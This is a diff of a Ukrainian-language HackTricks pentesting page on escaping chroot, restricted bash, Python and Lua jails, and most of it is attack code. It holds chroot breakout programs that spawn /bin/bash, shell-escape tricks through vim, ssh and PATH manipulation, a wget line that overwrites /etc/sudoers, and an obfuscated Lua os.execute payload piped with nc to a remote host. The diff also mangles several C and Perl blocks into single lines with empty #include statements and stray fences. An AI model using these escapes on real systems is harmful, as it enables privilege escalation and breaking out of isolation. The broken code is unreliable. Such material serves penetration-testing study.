@@ -1,4 +1,4 @@
-# Втеча з в'язниці
+# Escaping from Jails
 
 <details>
 
@@ -9,7 +9,7 @@
 * Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
 * Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
 * Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.
 
 </details>
@@ -40,24 +40,14 @@
 <details>
 
 <summary>C: break_chroot.c</summary>
-```c
-#include <sys/stat.h>
-#include <stdlib.h>
-#include <unistd.h>
 
-//gcc break_chroot.c -o break_chroot
+\`\`\`c #include #include #include
 
-int main(void)
-{
-mkdir("chroot-dir", 0755);
-chroot("chroot-dir");
-for(int i = 0; i < 1000; i++) {
-chdir("..");
-}
-chroot(".");
-system("/bin/bash");
-}
-```
+//gcc break\_chroot.c -o break\_chroot
+
+int main(void) { mkdir("chroot-dir", 0755); chroot("chroot-dir"); for(int i = 0; i < 1000; i++) { chdir(".."); } chroot("."); system("/bin/bash"); }
+
+````
 </details>
 
 <details>
@@ -72,22 +62,16 @@ for i in range(1000):
 os.chdir("..")
 os.chroot(".")
 os.system("/bin/bash")
-```
+````
+
 </details>
 
 <details>
 
 <summary>Перл</summary>
-```perl
-#!/usr/bin/perl
-mkdir "chroot-dir";
-chroot "chroot-dir";
-foreach my $i (0..1000) {
-chdir ".."
-}
-chroot ".";
-system("/bin/bash");
-```
+
+\`\`\`perl #!/usr/bin/perl mkdir "chroot-dir"; chroot "chroot-dir"; foreach my $i (0..1000) { chdir ".." } chroot "."; system("/bin/bash"); \`\`\`
+
 </details>
 
 ### Root + Збережений fd
@@ -99,31 +83,20 @@ system("/bin/bash");
 <details>
 
 <summary>C: break_chroot.c</summary>
-```c
-#include <sys/stat.h>
-#include <stdlib.h>
-#include <unistd.h>
 
-//gcc break_chroot.c -o break_chroot
+\`\`\`c #include #include #include
 
-int main(void)
-{
-mkdir("tmpdir", 0755);
-dir_fd = open(".", O_RDONLY);
-if(chroot("tmpdir")){
-perror("chroot");
-}
-fchdir(dir_fd);
-close(dir_fd);
-for(x = 0; x < 1000; x++) chdir("..");
-chroot(".");
-}
-```
+//gcc break\_chroot.c -o break\_chroot
+
+int main(void) { mkdir("tmpdir", 0755); dir\_fd = open(".", O\_RDONLY); if(chroot("tmpdir")){ perror("chroot"); } fchdir(dir\_fd); close(dir\_fd); for(x = 0; x < 1000; x++) chdir(".."); chroot("."); }
+
+````
 </details>
 
 ### Root + Fork + UDS (Unix Domain Sockets)
 
-{% hint style="warning" %}
+<div data-gb-custom-block data-tag="hint" data-style='warning'>
+
 FD можна передавати через Unix Domain Sockets, тому:
 
 * Створіть дочірній процес (fork)
@@ -132,39 +105,48 @@ FD можна передавати через Unix Domain Sockets, тому:
 * У батьківському процесі створіть FD папки, яка знаходиться поза новим chroot дочірнього процесу
 * Передайте цей FD дочірньому процесу, використовуючи UDS
 * Дочірній процес змінює поточну директорію на цей FD, і через те, що вона знаходиться поза його chroot, він вибереться з в'язниці
-{% endhint %}
+
+</div>
 
 ### &#x20;Root + Mount
 
-{% hint style="warning" %}
+<div data-gb-custom-block data-tag="hint" data-style='warning'>
+
 * Монтування кореневого пристрою (/) в каталог всередині chroot
 * Chroot в цей каталог
 
 Це можливо в Linux
-{% endhint %}
+
+</div>
 
 ### Root + /proc
 
-{% hint style="warning" %}
+<div data-gb-custom-block data-tag="hint" data-style='warning'>
+
 * Монтування procfs в каталог всередині chroot (якщо ще не)
 * Шукайте pid, у якого інший корінь/поточна директорія, наприклад: /proc/1/root
 * Chroot в цей запис
-{% endhint %}
+
+</div>
 
 ### Root(?) + Fork
 
-{% hint style="warning" %}
+<div data-gb-custom-block data-tag="hint" data-style='warning'>
+
 * Створіть Fork (дочірній процес) і chroot в іншу папку глибше в файловій системі та CD на неї
 * З батьківського процесу перемістіть папку, де знаходиться дочірній процес, в папку перед chroot дітей
 * Цей дочірній процес виявить себе поза chroot
-{% endhint %}
+
+</div>
 
 ### ptrace
 
-{% hint style="warning" %}
+<div data-gb-custom-block data-tag="hint" data-style='warning'>
+
 * Колись користувачі могли налагоджувати власні процеси з процесу самого себе... але це більше не можливо за замовчуванням
 * У будь-якому випадку, якщо це можливо, ви можете використовувати ptrace в процесі та виконати shellcode всередині нього ([див. цей приклад](linux-capabilities.md#cap\_sys\_ptrace)).
-{% endhint %}
+
+</div>
 
 ## Bash Jails
 
@@ -177,84 +159,96 @@ echo $PATH
 env
 export
 pwd
-```
-### Зміна PATH
+````
+
+#### Зміна PATH
 
 Перевірте, чи можете ви змінити змінну середовища PATH
+
 ```bash
 echo $PATH #See the path of the executables that you can use
 PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
 echo /home/* #List directory
 ```
-### Використання vim
+
+#### Використання vim
+
 ```bash
 :set shell=/bin/sh
 :shell
 ```
-### Створення скрипту
+
+#### Створення скрипту
 
 Перевірте, чи можете ви створити виконуваний файл з вмістом _/bin/bash_
+
 ```bash
 red /bin/bash
 > w wx/path #Write /bin/bash in a writable and executable path
 ```
-### Отримання bash з SSH
+
+#### Отримання bash з SSH
 
 Якщо ви отримуєте доступ через ssh, ви можете скористатися цим трюком для виконання оболонки bash:
+
 ```bash
 ssh -t user@<IP> bash # Get directly an interactive shell
 ssh user@<IP> -t "bash --noprofile -i"
 ssh user@<IP> -t "() { :; }; sh -i "
 ```
-### Оголошення
+
+#### Оголошення
+
 ```bash
 declare -n PATH; export PATH=/bin;bash -i
 
 BASH_CMDS[shell]=/bin/bash;shell -i
 ```
-### Wget
+
+#### Wget
 
 Ви можете перезаписати, наприклад, файл sudoers
+
 ```bash
 wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 ```
-### Інші трюки
+
+#### Інші трюки
 
 [**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
 [https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
 [https://gtfobins.github.io](https://gtfobins.github.io)\
 **Також може бути цікавою сторінка:**
 
-{% content-ref url="../useful-linux-commands/bypass-bash-restrictions.md" %}
-[bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
-{% endcontent-ref %}
-
-## Python Jails
+### Python Jails
 
 Трюки щодо виходу з Python-в'язниць на наступній сторінці:
 
-{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
-[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
-{% endcontent-ref %}
-
-## Lua Jails
+### Lua Jails
 
 На цій сторінці ви можете знайти глобальні функції, до яких у вас є доступ всередині Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)
 
 **Оцінка з виконанням команд:**
+
 ```bash
 load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
 ```
+
 Деякі трюки для **виклику функцій бібліотеки без використання крапок**:
+
 ```bash
 print(string.char(0x41, 0x42))
 print(rawget(string, "char")(0x41, 0x42))
 ```
+
 Перерахуйте функції бібліотеки:
+
 ```bash
 for k,v in pairs(string) do print(k,v) end
 ```
+
 Зверніть увагу, що кожного разу, коли ви виконуєте попередню однорядкову команду в **різному середовищі lua, порядок функцій змінюється**. Тому, якщо вам потрібно виконати певну функцію, ви можете виконати атаку методом брут-форс, завантажуючи різні середовища lua та викликаючи першу функцію бібліотеки le:
+
 ```bash
 #In this scenario you could BF the victim that is generating a new lua environment
 #for every interaction with the following line and when you are lucky
@@ -265,24 +259,17 @@ for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end
 #and "char" from string library, and the use both to execute a command
 for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
 ```
+
 **Отримати інтерактивну lua оболонку**: Якщо ви знаходитесь всередині обмеженої lua оболонки, ви можете отримати нову lua оболонку (і, сподіваємося, необмежену), викликавши:
+
 ```bash
 debug.debug()
 ```
-## Посилання
+
+### Посилання
 
 * [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Слайди: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))
 
-<details>
 
-<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
-
-Інші способи підтримки HackTricks:
-
-* Якщо ви хочете побачити **рекламу вашої компанії на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
-* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
-* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.
 
 </details>
